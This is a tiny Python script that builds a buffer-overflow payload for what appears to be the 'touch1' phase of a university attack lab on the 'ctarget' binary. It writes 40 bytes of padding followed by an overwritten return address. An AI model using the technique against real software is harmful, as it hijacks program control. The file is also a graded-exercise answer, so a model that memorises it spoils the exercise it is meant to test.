f = open("./ctarget_touch1.bin", "wb")
f.write(bytes("a", encoding='ascii')*40)
f.write(int.to_bytes(0x00000000004017c0, 8, "little"))
f.close()